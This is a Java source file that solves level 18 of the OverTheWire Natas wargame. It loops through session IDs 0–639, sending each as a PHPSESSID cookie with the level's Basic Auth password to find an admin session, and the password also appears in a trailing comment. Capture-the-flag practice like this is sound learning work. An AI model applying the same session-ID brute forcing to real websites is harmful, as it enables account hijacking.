package com.behnam.natas;

import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.http.*;
import org.springframework.stereotype.Component;
import org.springframework.web.client.RestTemplate;

import java.time.Duration;

@Component
public class Natas18 {
    public void checkSessionId(int sessionId) {
        long t0 = System.currentTimeMillis();
        RestTemplateBuilder restTemplateBuilder = new RestTemplateBuilder();
        restTemplateBuilder.setConnectTimeout(Duration.ofMillis(5));
        RestTemplate restTemplate = restTemplateBuilder.build();
        HttpHeaders headers = new HttpHeaders();
        headers.setBasicAuth("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP");
        headers.set("cookie","__utma=176859643.63447479.1608145620.1608145620.1608147678.2; __utmz=176859643.1608147678.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643; PHPSESSID="+sessionId);
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        HttpEntity<String> entity = new HttpEntity<String>("username=admin&password=admin", headers);
        ResponseEntity<String> result =
                restTemplate.exchange("http://natas18.natas.labs.overthewire.org/index.php",
                        HttpMethod.POST, entity, String.class);
        if (!result.getBody().contains("You are logged in as a regular user. Login as an admin to retrieve credentials for natas19"))
            System.out.println(result.getBody());

    }

    public void solve() {
        String password = "";
        for (int i = 0; i < 640; i++) {
            checkSessionId(i);
        }
    }
}
//xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP